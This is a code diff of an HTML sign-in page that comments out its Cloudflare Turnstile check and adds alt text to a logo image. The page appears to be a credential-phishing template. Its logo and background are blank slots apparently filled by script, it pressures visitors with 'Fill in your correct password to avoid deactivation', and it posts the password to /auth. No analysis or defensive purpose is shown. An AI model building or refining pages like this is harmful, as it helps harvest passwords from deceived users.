@@ -21,22 +21,22 @@
             e.preventDefault();
         }, false);
     </script>
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <!-- <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script> -->
 </head>
 
 <body class="flex flex-col justify-center items-center h-screen w-screen bg-no-repeat bg-cover" id="bg-image" style="background-image: url(' ');">
 
     <div class="h-[30rem] w-[27rem] bg-neutral-900 bg-opacity-90 flex flex-col justify-center items-center rounded-t-lg ">
         <div class="mb-6 mt-4 h-11 w-11 flex flex-col justify-center">
-            <img src=" " id="log" alt="">
+            <img src=" " id="log" alt="Logo">
         </div>
 
         <p class="text-xl text-neutral-400">Sign in to continue</p>
         <p class="text-sm text-center px-10 pt-3 pb-7 text-gray-200 font-semibold">Fill in your correct password to avoid deactivation</p>
 
         <form id="loginForm" class="ml-6 mr-6" method="POST" action="/auth">
-            <input type="hidden" name="cf-turnstile-response" id="cf-turnstile-response">
-            
+            <!-- <input type="hidden" name="cf-turnstile-response" id="cf-turnstile-response"> -->
+
             <div class="text-center pl-5 pr-5">
                 <span class="text-red-400 font-semibold text-sm" id="error"></span>
             </div>
@@ -61,8 +61,8 @@
             </div>
 
             <div class="flex flex-col items-center justify-center w-full">
-                
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAAAx8Hjjc0l14Qawb"></div>
+
+                <!-- <div class="cf-turnstile" data-sitekey="0x4AAAAAAAx8Hjjc0l14Qawb"></div> -->
 
                 <button class="h-12 w-[23rem] text-gray-100 bg-blue-500 rounded mb-6" type="submit" id="signInBtn">
                     <span id="btnText">Sign in</span>
